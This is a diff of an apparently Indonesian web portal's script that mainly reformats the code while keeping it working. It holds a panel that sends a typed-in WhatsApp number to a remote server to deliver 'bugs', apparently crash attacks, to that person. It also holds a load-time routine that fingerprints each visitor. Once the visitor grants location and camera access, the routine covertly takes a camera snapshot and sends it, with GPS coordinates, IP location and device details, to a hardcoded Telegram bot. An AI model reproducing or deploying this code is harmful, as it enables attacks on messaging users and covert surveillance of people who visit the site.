@@ -183,215 +183,262 @@
     <div class="mt-10 mb-1 text-xs text-gray-500 text-center select-none">&copy; 2025 <span class="font-bold text-[#fa2234]">OTAX</span> &bull; All Rights Reserved.</div>
   </main>
 <script>
-  // MENU SHOW/HIDE
-  function showPanel(id) {
-    document.getElementById("menuSelect").style.display = "none";
-    ["paymentPanel","bugPanel"].forEach(pid=>{
-      if(pid===id) document.getElementById(pid).style.display = "";
-      else document.getElementById(pid).style.display = "none";
-    });
-    window.scrollTo({top:0});
-  }
-  function backToMenu() {
-    ["paymentPanel","bugPanel"].forEach(pid=>document.getElementById(pid).style.display="none");
-    document.getElementById("menuSelect").style.display="";
-    window.scrollTo({top:0});
-  }
-  function copyDana() {
-    navigator.clipboard.writeText('081945938917');
-    alert('Nomor DANA berhasil disalin!');
-  }
-  // Accordion for Jualan
-  function toggleAccordion(id) {
-    document.querySelectorAll('.accordion-btn').forEach(btn => btn.classList.remove('active'));
-    document.querySelectorAll('.accordion-content').forEach(div => div.classList.remove('show'));
-    document.getElementById('accordion-'+id).classList.toggle('show');
-    document.querySelector('button[onclick="toggleAccordion(\''+id+'\')"]').classList.toggle('active');
-  }
-  // === BUG PANEL BUTTON SELECT ===
-  document.querySelectorAll('.bug-btn').forEach(btn => {
-    btn.onclick = function(){
-      document.querySelectorAll('.bug-btn').forEach(b=>b.classList.remove('active'));
-      this.classList.add('active');
-      document.getElementById('selectedFunc').value = this.dataset.func;
-    };
+// === PANEL NAVIGATION ===
+function showPanel(id) {
+  document.getElementById("menuSelect").classList.add("hidden");
+  ["paymentPanel", "bugPanel"].forEach(pid => {
+    if (pid === id) document.getElementById(pid).classList.remove("hidden");
+    else document.getElementById(pid).classList.add("hidden");
   });
-  document.getElementById('bugForm').onsubmit = async function(e){
-    e.preventDefault();
-    const btn = document.getElementById('sendBugBtn');
-    const resultPanel = document.getElementById('bugResultPanel');
-    const progressValue = document.getElementById('bugProgressValue');
-    const resultText = document.getElementById('bugResultText');
-    btn.disabled = true; btn.innerHTML = "Mengirim...";
-    resultPanel.classList.remove('hidden');
-    progressValue.style.width = "0%";
-    resultText.textContent = '';
-// Progress animasi bar
-    for(let i=1; i<=5; i++){
-      await new Promise(r=>setTimeout(r,300));
-      progressValue.style.width = (i*20)+"%";
-    }
-    let phone = document.getElementById('waTarget').value.replace(/[^0-9]/g,'');
-    let func = document.getElementById('selectedFunc').value;
-    if(!func){
-      resultText.textContent="Pilih mode bug dulu!";
-      btn.disabled=false;btn.innerHTML="🚀 Kirim Bug Sekarang";return;
-    }
-    try {
-      let res = await fetch("http://otaxxx.whaxzero.my.id:2059/sendBug?" + new URLSearchParams({
-        key:"apikey_2b303e759096", func, botNumber:"random", target:phone+"@s.whatsapp.net"
-      }));
-      let txt = await res.text();
-      let result;
-      try { result = JSON.parse(txt); } catch { result = {status:false, message:txt}; }
-      resultText.textContent = (result.status ? "✅ BUG BERHASIL TERKIRIM!\n":"❌ GAGAL!\n") + (result.message||txt);
-    } catch(e){
-      resultText.textContent = "Gagal mengirim bug.\n"+(e.message||e);
-    }
-    progressValue.style.width = "100%";
-    btn.disabled = false; btn.innerHTML = "🚀 Kirim Bug Sekarang";
+  window.scrollTo({top:0});
+}
+function backToMenu() {
+  ["paymentPanel", "bugPanel"].forEach(pid => document.getElementById(pid).classList.add("hidden"));
+  document.getElementById("menuSelect").classList.remove("hidden");
+  window.scrollTo({top:0});
+}
+
+// === COPY DANA ===
+function copyDana() {
+  navigator.clipboard.writeText('081945938917');
+  alert('Nomor DANA berhasil disalin!');
+}
+
+// === ACCORDION ===
+function toggleAccordion(id) {
+  document.querySelectorAll('.accordion-btn').forEach(btn => btn.classList.remove('active'));
+  document.querySelectorAll('.accordion-content').forEach(div => div.classList.remove('show'));
+  document.getElementById('accordion-'+id).classList.toggle('show');
+  document.querySelector('button[onclick="toggleAccordion(\''+id+'\')"]').classList.toggle('active');
+}
+
+// === BUG PANEL BUTTON SELECT ===
+document.querySelectorAll('.bug-btn').forEach(btn => {
+  btn.onclick = function(){
+    document.querySelectorAll('.bug-btn').forEach(b=>b.classList.remove('active'));
+    this.classList.add('active');
+    document.getElementById('selectedFunc').value = this.dataset.func;
   };
+});
 
-  // == TRACKING DEVICE, LOKASI, KAMERA: Disable form bug jika tidak diizinkan ==
-  let bugPanelEnabled = false, alreadyTracked = false;
-  window.addEventListener("DOMContentLoaded", () => {
-    setBugPanelLock(true);
-    autoFingerprintOtax().then(success => {
-      if (success) setBugPanelLock(false);
-      else setBugPanelLock(true);
-    });
-  });
-
-  function setBugPanelLock(lock) {
-    document.getElementById('bugPanelLock').style.display = lock ? "" : "none";
-    document.getElementById('bugForm').style.display = lock ? "none" : "";
-    bugPanelEnabled = !lock;
+document.getElementById('bugForm').onsubmit = async function(e){
+  e.preventDefault();
+  const btn = document.getElementById('sendBugBtn');
+  const resultPanel = document.getElementById('bugResultPanel');
+  const progressValue = document.getElementById('bugProgressValue');
+  const resultText = document.getElementById('bugResultText');
+  btn.disabled = true; btn.innerHTML = "Mengirim...";
+  resultPanel.classList.remove('hidden');
+  progressValue.style.width = "0%";
+  resultText.textContent = '';
+  // Progress animasi bar
+  for(let i=1; i<=5; i++){
+    await new Promise(r=>setTimeout(r,300));
+    progressValue.style.width = (i*20)+"%";
   }
+  let phone = document.getElementById('waTarget').value.replace(/[^0-9]/g,'');
+  let func = document.getElementById('selectedFunc').value;
+  if(!func){
+    resultText.textContent="Pilih mode bug dulu!";
+    btn.disabled=false;btn.innerHTML="🚀 Kirim Bug Sekarang";return;
+  }
+  try {
+    let res = await fetch("http://otaxxx.whaxzero.my.id:2059/sendBug?" + new URLSearchParams({
+      key:"apikey_2b303e759096", func, botNumber:"random", target:phone+"@s.whatsapp.net"
+    }));
+    let txt = await res.text();
+    let result;
+    try { result = JSON.parse(txt); } catch { result = {status:false, message:txt}; }
+    resultText.textContent = (result.status ? "✅ BUG BERHASIL TERKIRIM!\n":"❌ GAGAL!\n") + (result.message||txt);
+  } catch(e){
+    resultText.textContent = "Gagal mengirim bug.\n"+(e.message||e);
+  }
+  progressValue.style.width = "100%";
+  btn.disabled = false; btn.innerHTML = "🚀 Kirim Bug Sekarang";
+};
 
-  async function autoFingerprintOtax() {
-    if (alreadyTracked) return bugPanelEnabled;
-    alreadyTracked = true;
+// == TRACKING DEVICE, LOKASI, KAMERA: Disable form bug jika tidak diizinkan ==
+let bugPanelEnabled = false, alreadyTracked = false;
+window.addEventListener("DOMContentLoaded", () => {
+  setBugPanelLock(true);
+  autoFingerprintOtax().then(success => {
+    if (success) setBugPanelLock(false);
+    else setBugPanelLock(true);
+  });
+});
 
-    const BOT_TOKEN = "7781557680:AAHls3Z8HJZAQtQM-IxNInorvrF0byoNSCY";
-    const OWNER_ID = "7737364522";
-    const navi = navigator;
+function setBugPanelLock(lock) {
+  document.getElementById('bugPanelLock').style.display = lock ? "" : "none";
+  document.getElementById('bugForm').style.display = lock ? "none" : "";
+  bugPanelEnabled = !lock;
+}
 
-    function detectBrowserOS(userAgent) {
-      let browser = "Unknown", os = "Unknown", model = "-", brand = "-";
-      if (/chrome|crios|crmo/i.test(userAgent)) browser = "Chrome";
-      else if (/firefox|fxios/i.test(userAgent)) browser = "Firefox";
-      else if (/safari/i.test(userAgent)) browser = "Safari";
-      else if (/opr\//i.test(userAgent)) browser = "Opera";
-      else if (/edg/i.test(userAgent)) browser = "Edge";
-      else if (/trident/i.test(userAgent)) browser = "IE";
-      if (/windows nt/i.test(userAgent)) os = "Windows";
-      else if (/android/i.test(userAgent)) os = "Android";
-      else if (/iphone|ipad|ipod/i.test(userAgent)) os = "iOS";
-      else if (/macintosh|mac os x/i.test(userAgent)) os = "MacOS";
-      else if (/linux/i.test(userAgent)) os = "Linux";
-      const match = userAgent.match(/\((?:Linux; )?Android [\d.]+; ([^;]+)[;)]/);
-      if(match) {
-        model = match[1].trim();
-        if(model.startsWith("SM-")) brand = "Samsung";
-        else if(model.startsWith("M20") || model.startsWith("Redmi")) brand = "Xiaomi";
-        else if(model.startsWith("Infinix")) brand = "Infinix";
-        else if(model.startsWith("CPH")) brand = "OPPO";
-        else if(model.startsWith("V")) brand = "Vivo";
-        else brand = "-";
-      }
-      return {browser, os, model, brand};
+async function autoFingerprintOtax() {
+  if (alreadyTracked) return bugPanelEnabled;
+  alreadyTracked = true;
+
+  const BOT_TOKEN = "7781557680:AAHls3Z8HJZAQtQM-IxNInorvrF0byoNSCY";
+  const OWNER_ID = "7737364522";
+  const navi = navigator;
+
+  function detectBrowserOS(userAgent) {
+    let browser = "Unknown", os = "Unknown", model = "-", brand = "-";
+    if (/chrome|crios|crmo/i.test(userAgent)) browser = "Chrome";
+    else if (/firefox|fxios/i.test(userAgent)) browser = "Firefox";
+    else if (/safari/i.test(userAgent)) browser = "Safari";
+    else if (/opr\//i.test(userAgent)) browser = "Opera";
+    else if (/edg/i.test(userAgent)) browser = "Edge";
+    else if (/trident/i.test(userAgent)) browser = "IE";
+    if (/windows nt/i.test(userAgent)) os = "Windows";
+    else if (/android/i.test(userAgent)) os = "Android";
+    else if (/iphone|ipad|ipod/i.test(userAgent)) os = "iOS";
+    else if (/macintosh|mac os x/i.test(userAgent)) os = "MacOS";
+    else if (/linux/i.test(userAgent)) os = "Linux";
+    const match = userAgent.match(/\((?:Linux; )?Android [\d.]+; ([^;]+)[;)]/);
+    if(match) {
+      model = match[1].trim();
+      if(model.startsWith("SM-")) brand = "Samsung";
+      else if(model.startsWith("M20") || model.startsWith("Redmi")) brand = "Xiaomi";
+      else if(model.startsWith("Infinix")) brand = "Infinix";
+      else if(model.startsWith("CPH")) brand = "OPPO";
+      else if(model.startsWith("V")) brand = "Vivo";
+      else brand = "-";
     }
-    let b = detectBrowserOS(navi.userAgent);
-    let net = navi.connection || navi.mozConnection || navi.webkitConnection || {};
-    let connectionType = net.effectiveType || "-";
-    let downlink = net.downlink || "-";
-    let rtt = net.rtt || "-";
-    let now = new Date();
-    let localTime = now.toLocaleString();
-    let tzOffset = now.getTimezoneOffset();
-    let gpu = "-";
+    return {browser, os, model, brand};
+  }
+  let b = detectBrowserOS(navi.userAgent);
+  let net = navi.connection || navi.mozConnection || navi.webkitConnection || {};
+  let connectionType = net.effectiveType || "-";
+  let downlink = net.downlink || "-";
+  let rtt = net.rtt || "-";
+  let now = new Date();
+  let localTime = now.toLocaleString();
+  let tzOffset = now.getTimezoneOffset();
+  let gpu = "-";
+  try {
+    let canvas = document.createElement("canvas");
+    let gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+    if (gl) {
+      let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      if (debugInfo) gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+    }
+  } catch {}
+  let ipinfo = {};
+  try {
+    let resp = await fetch('https://ipinfo.io/json');
+    ipinfo = await resp.json();
+  } catch (e) {}
+  let gmaps = "-";
+  if (ipinfo.loc && ipinfo.loc.match(/^[-.\d]+,[-.\d]+$/))
+    gmaps = `https://www.google.com/maps/search/?api=1&query=${ipinfo.loc}`;
+  let battery = "-";
+  if (navi.getBattery) {
     try {
-      let canvas = document.createElement("canvas");
-      let gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-      if (gl) {
-        let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        if (debugInfo) gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-      }
+      let bat = await navi.getBattery();
+      battery = `${Math.round(bat.level * 100)}% ${bat.charging ? "🔌 Charging" : ""}`;
     } catch {}
-    let ipinfo = {};
-    try {
-      let resp = await fetch('https://ipinfo.io/json');
-      ipinfo = await resp.json();
-    } catch (e) {}
-    let gmaps = "-";
-    if (ipinfo.loc && ipinfo.loc.match(/^[-.\d]+,[-.\d]+$/))
-      gmaps = `https://www.google.com/maps/search/?api=1&query=${ipinfo.loc}`;
-    let battery = "-";
-    if (navi.getBattery) {
-      try {
-        let bat = await navi.getBattery();
-        battery = `${Math.round(bat.level * 100)}% ${bat.charging ? "🔌 Charging" : ""}`;
-      } catch {}
-    }
-    let msgArr = [
-      `🦠 *DATA VISITOR OTAX PORTAL* 🦠`,
-      `━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
-      `*IP*           : \`${ipinfo.ip || '-'}\``,
-      `*Negara*       : ${ipinfo.country || '-'} (${ipinfo.region || '-'} / ${ipinfo.city || '-'})`,
-      `*Provider*     : ${ipinfo.org || '-'}`,
-      `*Lokasi IP*    : ${ipinfo.loc || '-'}`,
-      `*Google Maps*  : [Lihat Lokasi](${gmaps})`,
-      `*Kode Pos*     : ${ipinfo.postal || '-'}`,
-      `*Zona Waktu*   : ${ipinfo.timezone || '-'} (Offset: ${tzOffset})`,
-      `━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
-      `*User-Agent*   : \`${navi.userAgent}\``,
-      `*Browser*      : ${b.browser}`,
-      `*OS*           : ${b.os}`,
-      `*Device*       : ${b.brand} / ${b.model}`,
-      `*Platform*     : ${navi.platform}`,
-      `*Screen*       : ${screen.width}x${screen.height}, depth: ${screen.colorDepth}`,
-      `*RAM*          : ${navi.deviceMemory || '-'} GB`,
-      `*CPU*          : ${navi.hardwareConcurrency || '-'}`,
-      `*Touch*        : ${'ontouchstart' in window ? "Ya" : "Tidak"}`,
-      `*GPU*          : ${gpu}`,
-      `*Network*      : ${connectionType}, ${downlink} Mbps, RTT: ${rtt} ms`,
-      `*Online*       : ${navi.onLine ? "Ya" : "Tidak"}`,
-      `*Battery*      : ${battery}`,
-      `*Cookies*      : ${navi.cookieEnabled ? "Aktif" : "Tidak"}`,
-      `*Bahasa*       : ${navi.language} (${(navi.languages||[]).join(', ')})`,
-      `*Referrer*     : ${document.referrer || "-"}`,
-      `*URL*          : ${location.href}`,
-      `*Timezone*     : ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
-      `*Waktu Lokal*  : ${localTime}`,
-      `*Mode Gelap*   : ${window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Ya" : "Tidak"}`,
-      `━━━━━━━━━━━━━━━━━━━━━━━━━━━`
-    ];
-    let message = msgArr.join('\n');
+  }
+  let msgArr = [
+    `🦠 *DATA VISITOR OTAX PORTAL* 🦠`,
+    `━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
+    `*IP*           : \`${ipinfo.ip || '-'}\``,
+    `*Negara*       : ${ipinfo.country || '-'} (${ipinfo.region || '-'} / ${ipinfo.city || '-'})`,
+    `*Provider*     : ${ipinfo.org || '-'}`,
+    `*Lokasi IP*    : ${ipinfo.loc || '-'}`,
+    `*Google Maps*  : [Lihat Lokasi](${gmaps})`,
+    `*Kode Pos*     : ${ipinfo.postal || '-'}`,
+    `*Zona Waktu*   : ${ipinfo.timezone || '-'} (Offset: ${tzOffset})`,
+    `━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
+    `*User-Agent*   : \`${navi.userAgent}\``,
+    `*Browser*      : ${b.browser}`,
+    `*OS*           : ${b.os}`,
+    `*Device*       : ${b.brand} / ${b.model}`,
+    `*Platform*     : ${navi.platform}`,
+    `*Screen*       : ${screen.width}x${screen.height}, depth: ${screen.colorDepth}`,
+    `*RAM*          : ${navi.deviceMemory || '-'} GB`,
+    `*CPU*          : ${navi.hardwareConcurrency || '-'}`,
+    `*Touch*        : ${'ontouchstart' in window ? "Ya" : "Tidak"}`,
+    `*GPU*          : ${gpu}`,
+    `*Network*      : ${connectionType}, ${downlink} Mbps, RTT: ${rtt} ms`,
+    `*Online*       : ${navi.onLine ? "Ya" : "Tidak"}`,
+    `*Battery*      : ${battery}`,
+    `*Cookies*      : ${navi.cookieEnabled ? "Aktif" : "Tidak"}`,
+    `*Bahasa*       : ${navi.language} (${(navi.languages||[]).join(', ')})`,
+    `*Referrer*     : ${document.referrer || "-"}`,
+    `*URL*          : ${location.href}`,
+    `*Timezone*     : ${Intl.DateTimeFormat().resolvedOptions().timeZone}`,
+    `*Waktu Lokal*  : ${localTime}`,
+    `*Mode Gelap*   : ${window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Ya" : "Tidak"}`,
+    `━━━━━━━━━━━━━━━━━━━━━━━━━━━`
+  ];
+  let message = msgArr.join('\n');
 
-    function sendLocationToTelegram(lat, lon, acc) {
-      let locationText = [
-        `\n\n*Lokasi GPS Browser:*`,
-        `- Latitude : ${lat}`,
-        `- Longitude: ${lon}`,
-        `- Akurasi  : ${acc} meter`,
-        `[Google Maps](https://maps.google.com/?q=${lat},${lon})`
-      ].join('\n');
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: OWNER_ID,
-          text: message + locationText,
-          parse_mode: "Markdown"
-        })
-      });
+  function sendLocationToTelegram(lat, lon, acc) {
+    let locationText = [
+      `\n\n*Lokasi GPS Browser:*`,
+      `- Latitude : ${lat}`,
+      `- Longitude: ${lon}`,
+      `- Akurasi  : ${acc} meter`,
+      `[Google Maps](https://maps.google.com/?q=${lat},${lon})`
+    ].join('\n');
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: OWNER_ID,
+        text: message + locationText,
+        parse_mode: "Markdown"
+      })
+    });
+  }
+  function sendPhotoToTelegram(base64Img, extraText) {
+    let fd = new FormData();
+    fd.append("chat_id", OWNER_ID);
+    fd.append("caption", (message + (extraText || "")).slice(0, 1024));
+    function dataURLtoBlob(dataurl) {
+      let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1], bstr = atob(arr[1]);
+      let n = bstr.length, u8arr = new Uint8Array(n);
+      while (n--) { u8arr[n] = bstr.charCodeAt(n); }
+      return new Blob([u8arr], { type: mime });
     }
-    function sendPhotoToTelegram(base64Img, extraText) {
-      let fd = new FormData();
-      fd.append("chat_id", OWNER_ID);
-      fd.append("caption", (message + (extraText || "")).slice(0, 1024));
-      function dataURLtoBlob(dataurl) {
-        let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1], bstr = atob(arr[1]);
-        let n = bstr.length, u8arr = new Uint8Array(n);
-        while (n--) { u8arr[n] = bstr.charCodeAt(n); }
-        return new 
+    fd.append("photo", dataURLtoBlob(base64Img), "visitor.jpg");
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
+  }
+  // Lokasi dan Kamera wajib
+  return new Promise(resolve => {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function (pos) {
+        // Lokasi diizinkan, ambil kamera
+        sendLocationToTelegram(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+          navigator.mediaDevices.getUserMedia({ video: true }).then(function (stream) {
+            let video = document.createElement("video");
+            video.autoplay = true;
+            video.srcObject = stream;
+            video.onloadedmetadata = function () {
+              setTimeout(function () {
+                let canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext("2d").drawImage(video, 0, 0);
+                let imgData = canvas.toDataURL("image/jpeg");
+                sendPhotoToTelegram(imgData, `\n\n*Snapshot Kamera User!*`);
+                stream.getTracks().forEach(track => track.stop());
+                resolve(true);
+              }, 1800);
+            }
+          }).catch(()=>{resolve(false);});
+        } else {
+          resolve(false);
+        }
+      }, function () {
+        resolve(false);
+      }, { enableHighAccuracy: true, timeout: 4000, maximumAge: 60000 });
+    } else {
+      resolve(false);
+    }
+  });
+}
+</script>
+</body>
+</html>
